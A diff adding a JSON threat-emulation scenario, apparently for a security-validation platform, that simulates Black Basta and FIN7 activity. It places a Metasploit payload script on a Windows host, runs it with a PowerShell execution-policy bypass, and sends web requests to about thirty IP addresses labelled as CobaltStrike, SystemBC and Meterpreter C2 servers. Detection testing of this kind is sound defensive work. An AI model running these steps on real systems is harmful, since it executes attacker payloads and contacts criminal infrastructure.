@@ -1,0 +1,399 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "MSF payload and Network IOCs",
+        "display_name": "BlackBasta_IOCs",
+        "name": "BlackBasta_IOCs",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp 127.0.0.1:443 --multipart 10240 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "name": "REQUIREMENTS",
+                "type": "assign",
+                "value": "Please ensure to run as administrator"
+            },
+            "2": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "3": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "4": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS://shared/threats/BlackBasta_NewTTPs/msf_x64_svc.ps1\" --dest \"C:\\msf_x64_svc.ps1\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe -NoP -NonI -Exec Bypass -File \"C:\\msf_x64_svc.ps1\"",
+                "rtags": [
+                    "att&ck-technique:T1059.001"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "name": "Black Basta",
+                "type": "assign",
+                "value": "CobaltStrike C2 Server Address"
+            },
+            "7": {
+                "module": "loader",
+                "module_to_load": "upsh",
+                "request": "--load upsh",
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://185.217.1.23 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://159.223.236.110 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "10": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://193.29.13.159 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://193.29.13.216 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://193.29.13.170 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://190.123.44.126 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://190.123.44.130 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "15": {
+                "name": "BlackBasta",
+                "type": "assign",
+                "value": "NetSupport gateway IP"
+            },
+            "16": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://185.125.206.218 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "17": {
+                "name": "BlackBasta",
+                "type": "assign",
+                "value": "SystemBC C2"
+            },
+            "18": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://95.179.161.101 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "19": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://69.46.15.147 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "20": {
+                "name": "FIN7",
+                "type": "assign",
+                "value": "Testing Infrastructure IP"
+            },
+            "21": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://87.247.152.249 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "22": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://185.107.80.78 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "23": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://177.54.145.139 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "24": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://109.248.149.137 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "25": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://109.170.6.150 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "26": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://95.211.185.11 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "27": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://176.77.112.74 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "28": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://193.105.7.122 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "29": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://5.62.43.252 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "30": {
+                "name": "FIN7",
+                "type": "assign",
+                "value": "BIRDDOG C2 attacking infrastructure IP"
+            },
+            "31": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://45.67.229.148 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "32": {
+                "name": "FIN7",
+                "type": "assign",
+                "value": "CobaltStrike C2 Attacking Infrastructure IP"
+            },
+            "33": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://78.128.112.217 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "34": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://45.153.241.167 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "35": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://78.128.112.217 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "36": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://209.250.236.75 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "37": {
+                "name": "FIN7",
+                "type": "assign",
+                "value": "Meterpreter C2 Attacking Infrastructure IP"
+            },
+            "38": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://139.162.191.118 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "39": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://5.196.124.228 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "40": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://93.184.220.29 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "41": {
+                "name": "FIN7",
+                "type": "assign",
+                "value": "C2 Server Attacking Infrastructure"
+            },
+            "42": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://185.16.40.67 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "43": {
+                "name": "FIN7",
+                "type": "assign",
+                "value": "Autocad lure Campaign C2 Server attacking infrastructure IP"
+            },
+            "44": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://45.133.216.39 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "45": {
+                "name": "FIN7",
+                "type": "assign",
+                "value": "\"work_bin\" C2 server attacking infrastructure IP"
+            },
+            "46": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://45.87.154.208 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "47": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://213.109.192.116 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ }}",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "48": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "CLEAN-UP"
+            },
+            "49": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe /c del \"C:\\msf_x64_svc.ps1\"",
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
